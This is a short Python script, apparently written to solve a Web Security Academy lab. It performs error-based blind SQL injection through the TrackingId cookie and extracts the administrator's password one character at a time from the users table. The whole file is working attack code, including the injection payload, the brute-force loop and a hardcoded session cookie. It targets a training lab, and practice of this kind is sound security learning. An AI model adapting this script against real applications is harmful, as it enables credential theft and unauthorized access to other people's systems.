import requests as req
import string
import os
url = 'https://0afc00ca04d4a5218003d54900d50059.web-security-academy.net/'
pwd = ''
printable_text = string.printable
print("Guessing Pass")
for i in range(1,100):
    for j in printable_text:
        cookies = {
            "TrackingId": f"jNpICfSF7tqG4E2T'||(SELECT CASE WHEN (substr(password,{i},1) = '{j}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'' --",
            "session": "TUO98co1YBh9f9Xh41p8E7g1YhmQl6xC"
            
        }
        res =  req.get(url, cookies=cookies)
        print(f"try {j}, res: {res.status_code}")
        if res.status_code != 200:
            pwd = pwd+j
            os.system('cls' if os.name == 'nt' else 'clear')
            print("Guessing Pass:")
            print("word found: ", pwd)
            break
            
print(pwd)